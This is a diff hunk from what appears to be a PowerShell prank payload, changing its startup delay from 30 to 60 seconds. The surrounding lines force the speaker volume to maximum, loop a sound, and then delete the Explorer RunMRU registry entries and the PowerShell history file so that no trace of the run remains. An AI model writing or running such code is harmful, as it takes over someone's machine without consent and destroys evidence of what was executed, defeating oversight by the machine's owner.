@@ -11,7 +11,7 @@ Function Set-SpeakerVolume
   {1..50 | % {$wshShell.SendKeys([char]175)}}
   Else
   {$wshShell.SendKeys([char]173)} }
-sleep 30;
+sleep 60;
 Set-SpeakerVolume -Max
 $player.PlayLooping();
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
